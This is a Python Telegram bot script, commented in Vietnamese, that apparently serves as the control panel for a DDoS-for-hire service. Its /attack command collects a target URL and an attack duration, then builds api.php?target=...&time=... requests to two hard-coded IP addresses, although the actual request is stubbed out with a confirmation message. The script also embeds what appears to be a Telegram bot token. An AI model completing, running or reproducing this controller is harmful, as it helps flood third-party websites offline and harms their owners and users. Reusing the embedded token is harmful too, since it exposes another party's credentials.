import logging
import re
from telegram import Update, ForceReply
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters, ConversationHandler, CallbackContext

# Thiết lập logging để kiểm tra lỗi
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                     level=logging.INFO)

# Định nghĩa các trạng thái trong trò chuyện
TARGET, TIME = range(2)

# Danh sách các API URLs
API_URLS = [
    "http://103.178.235.84/api.php",
    "http://103.228.74.216/api.php",
]

# Hàm bắt đầu bot
def start(update: Update, _: CallbackContext) -> int:
    update.message.reply_text("Chào mừng bạn đến với bot điều khiển API.\n"
                              "Hãy sử dụng /attack để bắt đầu cuộc tấn công.")
    return TARGET

# Hàm xử lý lệnh /attack và yêu cầu nhập target
def attack(update: Update, _: CallbackContext) -> int:
    update.message.reply_text("Nhập target:")
    return TARGET

# Hàm nhận target và yêu cầu nhập time
def receive_target(update: Update, _: CallbackContext) -> int:
    target = update.message.text.strip()

    # Kiểm tra xem target có đúng định dạng URL hay không
    if not re.match(r'^https?://', target):
        update.message.reply_text("Target không hợp lệ. Hãy nhập đúng định dạng URL (http:// hoặc https://).")
        return TARGET

    # Lưu target vào user_data để sử dụng sau này
    _.user_data['target'] = target

    update.message.reply_text("Nhập time:")
    return TIME

# Hàm nhận time và thực hiện gọi API
def receive_time(update: Update, _: CallbackContext) -> int:
    time_str = update.message.text.strip()

    # Kiểm tra xem time có phải số nguyên dương hay không
    try:
        time = int(time_str)
        if time <= 0:
            raise ValueError
    except ValueError:
        update.message.reply_text("Time không hợp lệ. Hãy nhập một số nguyên dương.")
        return TIME

    # Thực hiện gọi API với target và time tương ứng
    target = _.user_data['target']

    for api_url in API_URLS:
        api_call_url = f"{api_url}?target={target}&time={time}"
        # Thực hiện gọi API ở đây (giả sử là in thông báo)
        update.message.reply_text(f"Đã thực hiện cuộc tấn công với target: {target} "
                                  f"và time: {time}.\nKết quả từ API ({api_url}): ...")

    # Trở về trạng thái ban đầu để có thể thực hiện các lần tấn công tiếp theo
    return TARGET

def main():
    # Khởi tạo Updater và thiết lập token của bot
    updater = Updater("6697374052:AAHoc6nHh5Z78i9GXM-xEJjzoiCklYPjf2M")

    # Lấy dispatcher để đăng ký các handler
    dispatcher = updater.dispatcher

    # Đăng ký các handler
    conv_handler = ConversationHandler(
        entry_points=[CommandHandler('attack', attack)],
        states={
            TARGET: [MessageHandler(Filters.text & ~Filters.command, receive_target)],
            TIME: [MessageHandler(Filters.text & ~Filters.command, receive_time)],
        },
        fallbacks=[CommandHandler('start', start)]
    )

    dispatcher.add_handler(conv_handler)

    # Bắt đầu bot
    updater.start_polling()

    # Dừng bot khi nhấn Ctrl + C
    updater.idle()

if __name__ == '__main__':
    main()
